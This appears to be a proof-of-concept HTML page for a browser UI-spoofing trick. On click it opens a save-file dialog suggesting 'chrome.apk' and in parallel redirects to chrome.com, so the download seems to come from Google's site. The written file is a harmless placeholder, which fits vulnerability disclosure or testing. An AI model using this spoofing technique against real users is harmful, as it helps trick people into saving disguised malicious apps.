<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC</title>
</head>
<body>

<h1>Click anywhere</h1>

<script>
document.addEventListener('click', async () => {
    // Delay kecil sebelum picker
    setTimeout(async () => {
        if ('showSaveFilePicker' in window) {
            try {
                const handle = await window.showSaveFilePicker({
                    suggestedName: 'chrome.apk',
                    types: [{
                        description: 'Android Package (demo)',
                        accept: {
                            'application/octet-stream': ['.apk']
                        }
                    }]
                });

                const writable = await handle.createWritable();
                await writable.write('Hai aja');
                await writable.close();

            } catch (err) {
                // cancel / abort expected
            }
        }
    }, 1000);

    // Redirect paralel
    setTimeout(() => {
        window.location.href = 'https://chrome.com';
    }, 1000);

}, { once: true });
</script>

</body>
</html>
